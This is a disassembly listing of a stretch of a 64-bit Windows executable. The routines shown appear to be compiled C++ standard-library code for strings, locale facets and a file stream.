   140007910:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007915:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000791a:	57                   	push   %rdi
   14000791b:	48 83 ec 20          	sub    $0x20,%rsp
   14000791f:	48 8d b1 78 ff ff ff 	lea    -0x88(%rcx),%rsi
   140007926:	48 8b d9             	mov    %rcx,%rbx
   140007929:	48 8b 06             	mov    (%rsi),%rax
   14000792c:	8b fa                	mov    %edx,%edi
   14000792e:	4c 63 40 04          	movslq 0x4(%rax),%r8
   140007932:	48 8d 05 6f 70 00 00 	lea    0x706f(%rip),%rax        # 0x14000e9a8
   140007939:	49 89 84 08 78 ff ff 	mov    %rax,-0x88(%r8,%rcx,1)
   140007940:	ff 
   140007941:	48 8b 06             	mov    (%rsi),%rax
   140007944:	4c 63 40 04          	movslq 0x4(%rax),%r8
   140007948:	45 8d 88 78 ff ff ff 	lea    -0x88(%r8),%r9d
   14000794f:	45 89 8c 08 74 ff ff 	mov    %r9d,-0x8c(%r8,%rcx,1)
   140007956:	ff 
   140007957:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
   14000795b:	e8 10 fe ff ff       	call   0x140007770
   140007960:	48 8d 4b 88          	lea    -0x78(%rbx),%rcx
   140007964:	ff 15 0e 38 00 00    	call   *0x380e(%rip)        # 0x14000b178
   14000796a:	48 8b cb             	mov    %rbx,%rcx
   14000796d:	ff 15 9d 38 00 00    	call   *0x389d(%rip)        # 0x14000b210
   140007973:	40 f6 c7 01          	test   $0x1,%dil
   140007977:	74 0d                	je     0x140007986
   140007979:	ba e8 00 00 00       	mov    $0xe8,%edx
   14000797e:	48 8b ce             	mov    %rsi,%rcx
   140007981:	e8 16 11 00 00       	call   0x140008a9c
   140007986:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000798b:	48 8b c6             	mov    %rsi,%rax
   14000798e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007993:	48 83 c4 20          	add    $0x20,%rsp
   140007997:	5f                   	pop    %rdi
   140007998:	c3                   	ret
   140007999:	cc                   	int3
   14000799a:	cc                   	int3
   14000799b:	cc                   	int3
   14000799c:	cc                   	int3
   14000799d:	cc                   	int3
   14000799e:	cc                   	int3
   14000799f:	cc                   	int3
   1400079a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400079a5:	57                   	push   %rdi
   1400079a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400079aa:	8b da                	mov    %edx,%ebx
   1400079ac:	48 8b f9             	mov    %rcx,%rdi
   1400079af:	e8 bc fd ff ff       	call   0x140007770
   1400079b4:	f6 c3 01             	test   $0x1,%bl
   1400079b7:	74 0d                	je     0x1400079c6
   1400079b9:	ba 78 00 00 00       	mov    $0x78,%edx
   1400079be:	48 8b cf             	mov    %rdi,%rcx
   1400079c1:	e8 d6 10 00 00       	call   0x140008a9c
   1400079c6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400079cb:	48 8b c7             	mov    %rdi,%rax
   1400079ce:	48 83 c4 20          	add    $0x20,%rsp
   1400079d2:	5f                   	pop    %rdi
   1400079d3:	c3                   	ret
   1400079d4:	cc                   	int3
   1400079d5:	cc                   	int3
   1400079d6:	cc                   	int3
   1400079d7:	cc                   	int3
   1400079d8:	cc                   	int3
   1400079d9:	cc                   	int3
   1400079da:	cc                   	int3
   1400079db:	cc                   	int3
   1400079dc:	cc                   	int3
   1400079dd:	cc                   	int3
   1400079de:	cc                   	int3
   1400079df:	cc                   	int3
   1400079e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400079e5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400079ea:	56                   	push   %rsi
   1400079eb:	57                   	push   %rdi
   1400079ec:	41 56                	push   %r14
   1400079ee:	48 83 ec 30          	sub    $0x30,%rsp
   1400079f2:	45 33 f6             	xor    %r14d,%r14d
   1400079f5:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   1400079fc:	00 
   1400079fd:	48 bd fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbp
   140007a04:	ff ff 7f 
   140007a07:	4c 89 71 10          	mov    %r14,0x10(%rcx)
   140007a0b:	49 8b f9             	mov    %r9,%rdi
   140007a0e:	48 8b da             	mov    %rdx,%rbx
   140007a11:	48 8b f1             	mov    %rcx,%rsi
   140007a14:	4c 3b cd             	cmp    %rbp,%r9
   140007a17:	0f 87 09 01 00 00    	ja     0x140007b26
   140007a1d:	49 83 f9 07          	cmp    $0x7,%r9
   140007a21:	0f 86 b2 00 00 00    	jbe    0x140007ad9
   140007a27:	49 8b c1             	mov    %r9,%rax
   140007a2a:	48 83 c8 07          	or     $0x7,%rax
   140007a2e:	48 3b c5             	cmp    %rbp,%rax
   140007a31:	76 48                	jbe    0x140007a7b
   140007a33:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140007a3a:	ff ff 7f 
   140007a3d:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140007a41:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140007a48:	72 6f                	jb     0x140007ab9
   140007a4a:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140007a4e:	48 3b c1             	cmp    %rcx,%rax
   140007a51:	0f 86 c9 00 00 00    	jbe    0x140007b20
   140007a57:	48 8b c8             	mov    %rax,%rcx
   140007a5a:	e8 c1 0d 00 00       	call   0x140008820
   140007a5f:	48 8b c8             	mov    %rax,%rcx
   140007a62:	48 85 c0             	test   %rax,%rax
   140007a65:	75 44                	jne    0x140007aab
   140007a67:	45 33 c9             	xor    %r9d,%r9d
   140007a6a:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140007a6f:	45 33 c0             	xor    %r8d,%r8d
   140007a72:	33 d2                	xor    %edx,%edx
   140007a74:	ff 15 d6 38 00 00    	call   *0x38d6(%rip)        # 0x14000b350
   140007a7a:	cc                   	int3
   140007a7b:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140007a80:	48 8b e8             	mov    %rax,%rbp
   140007a83:	48 3b c1             	cmp    %rcx,%rax
   140007a86:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140007a8d:	ff ff 7f 
   140007a90:	48 0f 42 e9          	cmovb  %rcx,%rbp
   140007a94:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   140007a98:	48 3b c8             	cmp    %rax,%rcx
   140007a9b:	0f 87 7f 00 00 00    	ja     0x140007b20
   140007aa1:	48 03 c9             	add    %rcx,%rcx
   140007aa4:	75 9b                	jne    0x140007a41
   140007aa6:	49 8b c6             	mov    %r14,%rax
   140007aa9:	eb 13                	jmp    0x140007abe
   140007aab:	48 83 c0 27          	add    $0x27,%rax
   140007aaf:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   140007ab3:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140007ab7:	eb 05                	jmp    0x140007abe
   140007ab9:	e8 62 0d 00 00       	call   0x140008820
   140007abe:	48 89 06             	mov    %rax,(%rsi)
   140007ac1:	4c 8b c6             	mov    %rsi,%r8
   140007ac4:	48 89 6e 18          	mov    %rbp,0x18(%rsi)
   140007ac8:	48 83 fd 07          	cmp    $0x7,%rbp
   140007acc:	76 0e                	jbe    0x140007adc
   140007ace:	4c 8b c0             	mov    %rax,%r8
   140007ad1:	48 8b c8             	mov    %rax,%rcx
   140007ad4:	48 8b d7             	mov    %rdi,%rdx
   140007ad7:	eb 17                	jmp    0x140007af0
   140007ad9:	4c 8b c6             	mov    %rsi,%r8
   140007adc:	49 8b c8             	mov    %r8,%rcx
   140007adf:	48 8b d7             	mov    %rdi,%rdx
   140007ae2:	48 85 ff             	test   %rdi,%rdi
   140007ae5:	74 1d                	je     0x140007b04
   140007ae7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140007aee:	00 00 
   140007af0:	0f be 03             	movsbl (%rbx),%eax
   140007af3:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   140007af7:	66 89 01             	mov    %ax,(%rcx)
   140007afa:	48 8d 49 02          	lea    0x2(%rcx),%rcx
   140007afe:	48 83 ea 01          	sub    $0x1,%rdx
   140007b02:	75 ec                	jne    0x140007af0
   140007b04:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140007b09:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140007b0e:	48 89 7e 10          	mov    %rdi,0x10(%rsi)
   140007b12:	66 45 89 34 78       	mov    %r14w,(%r8,%rdi,2)
   140007b17:	48 83 c4 30          	add    $0x30,%rsp
   140007b1b:	41 5e                	pop    %r14
   140007b1d:	5f                   	pop    %rdi
   140007b1e:	5e                   	pop    %rsi
   140007b1f:	c3                   	ret
   140007b20:	e8 1b 9b ff ff       	call   0x140001640
   140007b25:	cc                   	int3
   140007b26:	e8 b5 9b ff ff       	call   0x1400016e0
   140007b2b:	cc                   	int3
   140007b2c:	cc                   	int3
   140007b2d:	cc                   	int3
   140007b2e:	cc                   	int3
   140007b2f:	cc                   	int3
   140007b30:	40 55                	rex push %rbp
   140007b32:	56                   	push   %rsi
   140007b33:	57                   	push   %rdi
   140007b34:	41 56                	push   %r14
   140007b36:	48 83 ec 38          	sub    $0x38,%rsp
   140007b3a:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   140007b41:	ff ff 7f 
   140007b44:	49 8b f8             	mov    %r8,%rdi
   140007b47:	4c 8b f2             	mov    %rdx,%r14
   140007b4a:	48 8b f1             	mov    %rcx,%rsi
   140007b4d:	4c 3b c5             	cmp    %rbp,%r8
   140007b50:	0f 87 db 00 00 00    	ja     0x140007c31
   140007b56:	49 83 f8 0f          	cmp    $0xf,%r8
   140007b5a:	77 1f                	ja     0x140007b7b
   140007b5c:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140007b60:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   140007b67:	00 
   140007b68:	e8 1e 1c 00 00       	call   0x14000978b
   140007b6d:	c6 04 37 00          	movb   $0x0,(%rdi,%rsi,1)
   140007b71:	48 83 c4 38          	add    $0x38,%rsp
   140007b75:	41 5e                	pop    %r14
   140007b77:	5f                   	pop    %rdi
   140007b78:	5e                   	pop    %rsi
   140007b79:	5d                   	pop    %rbp
   140007b7a:	c3                   	ret
   140007b7b:	48 8b c7             	mov    %rdi,%rax
   140007b7e:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140007b83:	48 83 c8 0f          	or     $0xf,%rax
   140007b87:	48 3b c5             	cmp    %rbp,%rax
   140007b8a:	76 33                	jbe    0x140007bbf
   140007b8c:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   140007b93:	00 00 80 
   140007b96:	48 83 c0 27          	add    $0x27,%rax
   140007b9a:	48 8b c8             	mov    %rax,%rcx
   140007b9d:	e8 7e 0c 00 00       	call   0x140008820
   140007ba2:	48 85 c0             	test   %rax,%rax
   140007ba5:	75 48                	jne    0x140007bef
   140007ba7:	33 db                	xor    %ebx,%ebx
   140007ba9:	45 33 c9             	xor    %r9d,%r9d
   140007bac:	45 33 c0             	xor    %r8d,%r8d
   140007baf:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007bb4:	33 d2                	xor    %edx,%edx
   140007bb6:	33 c9                	xor    %ecx,%ecx
   140007bb8:	ff 15 92 37 00 00    	call   *0x3792(%rip)        # 0x14000b350
   140007bbe:	cc                   	int3
   140007bbf:	b9 16 00 00 00       	mov    $0x16,%ecx
   140007bc4:	48 8b e8             	mov    %rax,%rbp
   140007bc7:	48 3b c1             	cmp    %rcx,%rax
   140007bca:	48 0f 42 e9          	cmovb  %rcx,%rbp
   140007bce:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   140007bd2:	48 85 c9             	test   %rcx,%rcx
   140007bd5:	75 04                	jne    0x140007bdb
   140007bd7:	33 db                	xor    %ebx,%ebx
   140007bd9:	eb 2a                	jmp    0x140007c05
   140007bdb:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140007be2:	72 19                	jb     0x140007bfd
   140007be4:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140007be8:	48 3b c1             	cmp    %rcx,%rax
   140007beb:	76 4a                	jbe    0x140007c37
   140007bed:	eb ab                	jmp    0x140007b9a
   140007bef:	48 8d 58 27          	lea    0x27(%rax),%rbx
   140007bf3:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   140007bf7:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   140007bfb:	eb 08                	jmp    0x140007c05
   140007bfd:	e8 1e 0c 00 00       	call   0x140008820
   140007c02:	48 8b d8             	mov    %rax,%rbx
   140007c05:	4c 8b c7             	mov    %rdi,%r8
   140007c08:	48 89 1e             	mov    %rbx,(%rsi)
   140007c0b:	49 8b d6             	mov    %r14,%rdx
   140007c0e:	48 89 7e 10          	mov    %rdi,0x10(%rsi)
   140007c12:	48 8b cb             	mov    %rbx,%rcx
   140007c15:	48 89 6e 18          	mov    %rbp,0x18(%rsi)
   140007c19:	e8 6d 1b 00 00       	call   0x14000978b
   140007c1e:	c6 04 1f 00          	movb   $0x0,(%rdi,%rbx,1)
   140007c22:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007c27:	48 83 c4 38          	add    $0x38,%rsp
   140007c2b:	41 5e                	pop    %r14
   140007c2d:	5f                   	pop    %rdi
   140007c2e:	5e                   	pop    %rsi
   140007c2f:	5d                   	pop    %rbp
   140007c30:	c3                   	ret
   140007c31:	e8 aa 9a ff ff       	call   0x1400016e0
   140007c36:	cc                   	int3
   140007c37:	e8 04 9a ff ff       	call   0x140001640
   140007c3c:	cc                   	int3
   140007c3d:	cc                   	int3
   140007c3e:	cc                   	int3
   140007c3f:	cc                   	int3
   140007c40:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007c45:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140007c4a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007c4f:	57                   	push   %rdi
   140007c50:	48 83 ec 40          	sub    $0x40,%rsp
   140007c54:	48 8b 05 e5 a3 00 00 	mov    0xa3e5(%rip),%rax        # 0x140012040
   140007c5b:	48 33 c4             	xor    %rsp,%rax
   140007c5e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140007c63:	48 8b e9             	mov    %rcx,%rbp
   140007c66:	33 d2                	xor    %edx,%edx
   140007c68:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140007c6d:	ff 15 55 35 00 00    	call   *0x3555(%rip)        # 0x14000b1c8
   140007c73:	90                   	nop
   140007c74:	48 8b 05 d5 87 01 00 	mov    0x187d5(%rip),%rax        # 0x140020450
   140007c7b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007c80:	48 8b 1d 61 35 00 00 	mov    0x3561(%rip),%rbx        # 0x14000b1e8
   140007c87:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140007c8b:	75 2d                	jne    0x140007cba
   140007c8d:	33 d2                	xor    %edx,%edx
   140007c8f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007c94:	ff 15 2e 35 00 00    	call   *0x352e(%rip)        # 0x14000b1c8
   140007c9a:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140007c9e:	75 0f                	jne    0x140007caf
   140007ca0:	48 8b 05 39 35 00 00 	mov    0x3539(%rip),%rax        # 0x14000b1e0
   140007ca7:	ff 00                	incl   (%rax)
   140007ca9:	48 63 00             	movslq (%rax),%rax
   140007cac:	48 89 03             	mov    %rax,(%rbx)
   140007caf:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007cb4:	ff 15 06 35 00 00    	call   *0x3506(%rip)        # 0x14000b1c0
   140007cba:	48 8b 33             	mov    (%rbx),%rsi
   140007cbd:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140007cc1:	48 8d 3c f5 00 00 00 	lea    0x0(,%rsi,8),%rdi
   140007cc8:	00 
   140007cc9:	48 3b 71 18          	cmp    0x18(%rcx),%rsi
   140007ccd:	73 0f                	jae    0x140007cde
   140007ccf:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140007cd3:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   140007cd7:	48 85 db             	test   %rbx,%rbx
   140007cda:	75 68                	jne    0x140007d44
   140007cdc:	eb 02                	jmp    0x140007ce0
   140007cde:	33 db                	xor    %ebx,%ebx
   140007ce0:	80 79 24 00          	cmpb   $0x0,0x24(%rcx)
   140007ce4:	74 14                	je     0x140007cfa
   140007ce6:	ff 15 e4 34 00 00    	call   *0x34e4(%rip)        # 0x14000b1d0
   140007cec:	48 3b 70 18          	cmp    0x18(%rax),%rsi
   140007cf0:	73 0d                	jae    0x140007cff
   140007cf2:	48 8b 40 10          	mov    0x10(%rax),%rax
   140007cf6:	48 8b 1c 07          	mov    (%rdi,%rax,1),%rbx
   140007cfa:	48 85 db             	test   %rbx,%rbx
   140007cfd:	75 45                	jne    0x140007d44
   140007cff:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140007d04:	48 85 db             	test   %rbx,%rbx
   140007d07:	75 3b                	jne    0x140007d44
   140007d09:	48 8b d5             	mov    %rbp,%rdx
   140007d0c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007d11:	ff 15 c9 33 00 00    	call   *0x33c9(%rip)        # 0x14000b0e0
   140007d17:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140007d1b:	74 57                	je     0x140007d74
   140007d1d:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140007d22:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140007d27:	48 8b cb             	mov    %rbx,%rcx
   140007d2a:	e8 59 18 00 00       	call   0x140009588
   140007d2f:	48 8b 03             	mov    (%rbx),%rax
   140007d32:	48 8b cb             	mov    %rbx,%rcx
   140007d35:	ff 50 08             	call   *0x8(%rax)
   140007d38:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140007d3d:	48 89 1d 0c 87 01 00 	mov    %rbx,0x1870c(%rip)        # 0x140020450
   140007d44:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140007d49:	ff 15 71 34 00 00    	call   *0x3471(%rip)        # 0x14000b1c0
   140007d4f:	48 8b c3             	mov    %rbx,%rax
   140007d52:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140007d57:	48 33 cc             	xor    %rsp,%rcx
   140007d5a:	e8 a1 0a 00 00       	call   0x140008800
   140007d5f:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140007d64:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140007d69:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140007d6e:	48 83 c4 40          	add    $0x40,%rsp
   140007d72:	5f                   	pop    %rdi
   140007d73:	c3                   	ret
   140007d74:	e8 b7 99 ff ff       	call   0x140001730
   140007d79:	90                   	nop
   140007d7a:	cc                   	int3
   140007d7b:	cc                   	int3
   140007d7c:	cc                   	int3
   140007d7d:	cc                   	int3
   140007d7e:	cc                   	int3
   140007d7f:	cc                   	int3
   140007d80:	40 53                	rex push %rbx
   140007d82:	48 83 ec 20          	sub    $0x20,%rsp
   140007d86:	48 8b d9             	mov    %rcx,%rbx
   140007d89:	ff 15 49 34 00 00    	call   *0x3449(%rip)        # 0x14000b1d8
   140007d8f:	84 c0                	test   %al,%al
   140007d91:	75 0a                	jne    0x140007d9d
   140007d93:	48 8b 0b             	mov    (%rbx),%rcx
   140007d96:	ff 15 2c 33 00 00    	call   *0x332c(%rip)        # 0x14000b0c8
   140007d9c:	90                   	nop
   140007d9d:	48 8b 13             	mov    (%rbx),%rdx
   140007da0:	48 8b 02             	mov    (%rdx),%rax
   140007da3:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007da7:	48 8b 4c 11 48       	mov    0x48(%rcx,%rdx,1),%rcx
   140007dac:	48 85 c9             	test   %rcx,%rcx
   140007daf:	74 07                	je     0x140007db8
   140007db1:	48 8b 01             	mov    (%rcx),%rax
   140007db4:	ff 50 10             	call   *0x10(%rax)
   140007db7:	90                   	nop
   140007db8:	48 83 c4 20          	add    $0x20,%rsp
   140007dbc:	5b                   	pop    %rbx
   140007dbd:	c3                   	ret
   140007dbe:	cc                   	int3
   140007dbf:	cc                   	int3
   140007dc0:	48 8b 09             	mov    (%rcx),%rcx
   140007dc3:	48 85 c9             	test   %rcx,%rcx
   140007dc6:	74 0b                	je     0x140007dd3
   140007dc8:	48 8b 01             	mov    (%rcx),%rax
   140007dcb:	ba 01 00 00 00       	mov    $0x1,%edx
   140007dd0:	48 ff 20             	rex.W jmp *(%rax)
   140007dd3:	c3                   	ret
   140007dd4:	cc                   	int3
   140007dd5:	cc                   	int3
   140007dd6:	cc                   	int3
   140007dd7:	cc                   	int3
   140007dd8:	cc                   	int3
   140007dd9:	cc                   	int3
   140007dda:	cc                   	int3
   140007ddb:	cc                   	int3
   140007ddc:	cc                   	int3
   140007ddd:	cc                   	int3
   140007dde:	cc                   	int3
   140007ddf:	cc                   	int3
   140007de0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140007de5:	55                   	push   %rbp
   140007de6:	56                   	push   %rsi
   140007de7:	57                   	push   %rdi
   140007de8:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140007def:	48 8b 05 4a a2 00 00 	mov    0xa24a(%rip),%rax        # 0x140012040
   140007df6:	48 33 c4             	xor    %rsp,%rax
   140007df9:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140007e00:	00 
   140007e01:	48 8b da             	mov    %rdx,%rbx
   140007e04:	48 8b f9             	mov    %rcx,%rdi
   140007e07:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   140007e0c:	33 ed                	xor    %ebp,%ebp
   140007e0e:	89 6c 24 40          	mov    %ebp,0x40(%rsp)
   140007e12:	48 8d 05 3f 6c 00 00 	lea    0x6c3f(%rip),%rax        # 0x14000ea58
   140007e19:	48 89 01             	mov    %rax,(%rcx)
   140007e1c:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   140007e23:	ff 15 c7 32 00 00    	call   *0x32c7(%rip)        # 0x14000b0f0
   140007e29:	90                   	nop
   140007e2a:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140007e31:	00 
   140007e32:	45 33 c9             	xor    %r9d,%r9d
   140007e35:	45 33 c0             	xor    %r8d,%r8d
   140007e38:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140007e3c:	48 8b cf             	mov    %rdi,%rcx
   140007e3f:	ff 15 c3 32 00 00    	call   *0x32c3(%rip)        # 0x14000b108
   140007e45:	90                   	nop
   140007e46:	48 8b 07             	mov    (%rdi),%rax
   140007e49:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007e4d:	48 8d 05 e4 6b 00 00 	lea    0x6be4(%rip),%rax        # 0x14000ea38
   140007e54:	48 89 04 39          	mov    %rax,(%rcx,%rdi,1)
   140007e58:	48 8b 07             	mov    (%rdi),%rax
   140007e5b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007e5f:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140007e65:	89 54 39 fc          	mov    %edx,-0x4(%rcx,%rdi,1)
   140007e69:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007e6d:	ff 15 95 33 00 00    	call   *0x3395(%rip)        # 0x14000b208
   140007e73:	48 8d 05 3e 6b 00 00 	lea    0x6b3e(%rip),%rax        # 0x14000e9b8
   140007e7a:	48 89 47 08          	mov    %rax,0x8(%rdi)
   140007e7e:	40 88 af 84 00 00 00 	mov    %bpl,0x84(%rdi)
   140007e85:	40 88 6f 79          	mov    %bpl,0x79(%rdi)
   140007e89:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007e8d:	ff 15 8d 32 00 00    	call   *0x328d(%rip)        # 0x14000b120
   140007e93:	48 89 af 88 00 00 00 	mov    %rbp,0x88(%rdi)
   140007e9a:	48 8b 05 57 87 01 00 	mov    0x18757(%rip),%rax        # 0x1400205f8
   140007ea1:	48 89 47 7c          	mov    %rax,0x7c(%rdi)
   140007ea5:	48 89 6f 70          	mov    %rbp,0x70(%rdi)
   140007ea9:	ba 22 00 00 00       	mov    $0x22,%edx
   140007eae:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140007eb4:	48 8b cb             	mov    %rbx,%rcx
   140007eb7:	ff 15 33 33 00 00    	call   *0x3333(%rip)        # 0x14000b1f0
   140007ebd:	48 8b d8             	mov    %rax,%rbx
   140007ec0:	48 85 c0             	test   %rax,%rax
   140007ec3:	0f 84 e0 00 00 00    	je     0x140007fa9
   140007ec9:	c6 87 84 00 00 00 01 	movb   $0x1,0x84(%rdi)
   140007ed0:	40 88 6f 79          	mov    %bpl,0x79(%rdi)
   140007ed4:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007ed8:	ff 15 42 32 00 00    	call   *0x3242(%rip)        # 0x14000b120
   140007ede:	48 89 6c 24 70       	mov    %rbp,0x70(%rsp)
   140007ee3:	48 89 6c 24 68       	mov    %rbp,0x68(%rsp)
   140007ee8:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   140007eed:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140007ef2:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   140007ef7:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140007efc:	48 8b cb             	mov    %rbx,%rcx
   140007eff:	ff 15 cb 34 00 00    	call   *0x34cb(%rip)        # 0x14000b3d0
   140007f05:	4c 8b 4c 24 60       	mov    0x60(%rsp),%r9
   140007f0a:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   140007f0f:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140007f14:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140007f19:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140007f1e:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140007f23:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007f27:	ff 15 8b 32 00 00    	call   *0x328b(%rip)        # 0x14000b1b8
   140007f2d:	48 89 9f 88 00 00 00 	mov    %rbx,0x88(%rdi)
   140007f34:	48 8b 05 bd 86 01 00 	mov    0x186bd(%rip),%rax        # 0x1400205f8
   140007f3b:	48 89 47 7c          	mov    %rax,0x7c(%rdi)
   140007f3f:	48 89 6f 70          	mov    %rbp,0x70(%rdi)
   140007f43:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140007f48:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007f4c:	ff 15 ae 32 00 00    	call   *0x32ae(%rip)        # 0x14000b200
   140007f52:	90                   	nop
   140007f53:	48 8b c8             	mov    %rax,%rcx
   140007f56:	e8 e5 fc ff ff       	call   0x140007c40
   140007f5b:	48 8b d8             	mov    %rax,%rbx
   140007f5e:	48 8b c8             	mov    %rax,%rcx
   140007f61:	ff 15 41 32 00 00    	call   *0x3241(%rip)        # 0x14000b1a8
   140007f67:	84 c0                	test   %al,%al
   140007f69:	74 06                	je     0x140007f71
   140007f6b:	48 89 6f 70          	mov    %rbp,0x70(%rdi)
   140007f6f:	eb 0f                	jmp    0x140007f80
   140007f71:	48 89 5f 70          	mov    %rbx,0x70(%rdi)
   140007f75:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   140007f79:	ff 15 a1 31 00 00    	call   *0x31a1(%rip)        # 0x14000b120
   140007f7f:	90                   	nop
   140007f80:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140007f85:	48 85 c9             	test   %rcx,%rcx
   140007f88:	74 38                	je     0x140007fc2
   140007f8a:	4c 8b 01             	mov    (%rcx),%r8
   140007f8d:	41 ff 50 10          	call   *0x10(%r8)
   140007f91:	48 85 c0             	test   %rax,%rax
   140007f94:	74 2c                	je     0x140007fc2
   140007f96:	48 8b 08             	mov    (%rax),%rcx
   140007f99:	4c 8b 01             	mov    (%rcx),%r8
   140007f9c:	ba 01 00 00 00       	mov    $0x1,%edx
   140007fa1:	48 8b c8             	mov    %rax,%rcx
   140007fa4:	41 ff d0             	call   *%r8
   140007fa7:	eb 19                	jmp    0x140007fc2
   140007fa9:	48 8b 07             	mov    (%rdi),%rax
   140007fac:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007fb0:	48 03 cf             	add    %rdi,%rcx
   140007fb3:	45 33 c0             	xor    %r8d,%r8d
   140007fb6:	ba 02 00 00 00       	mov    $0x2,%edx
   140007fbb:	ff 15 27 31 00 00    	call   *0x3127(%rip)        # 0x14000b0e8
   140007fc1:	90                   	nop
   140007fc2:	48 8b c7             	mov    %rdi,%rax
   140007fc5:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140007fcc:	00 
   140007fcd:	48 33 cc             	xor    %rsp,%rcx
   140007fd0:	e8 2b 08 00 00       	call   0x140008800
   140007fd5:	48 8b 9c 24 c0 00 00 	mov    0xc0(%rsp),%rbx
   140007fdc:	00 
   140007fdd:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140007fe4:	5f                   	pop    %rdi
   140007fe5:	5e                   	pop    %rsi
   140007fe6:	5d                   	pop    %rbp
   140007fe7:	c3                   	ret
   140007fe8:	cc                   	int3
   140007fe9:	cc                   	int3
   140007fea:	cc                   	int3
   140007feb:	cc                   	int3
   140007fec:	cc                   	int3
   140007fed:	cc                   	int3
   140007fee:	cc                   	int3
   140007fef:	cc                   	int3
   140007ff0:	40 53                	rex push %rbx
